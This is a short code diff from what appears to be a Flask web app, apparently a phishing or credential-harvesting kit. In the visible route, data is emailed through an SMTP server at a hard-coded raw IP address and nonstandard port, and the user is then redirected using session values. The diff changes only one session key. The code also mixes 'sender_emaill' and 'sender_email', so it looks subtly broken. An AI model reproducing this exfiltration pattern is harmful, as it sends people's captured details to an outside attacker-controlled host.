@@ -167,7 +167,7 @@ def first():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman'), dman=session.get('dman'))
+        return redirect(url_for('benza', web=session.get('eman'), dman=session.get('ins'))
 
 
 
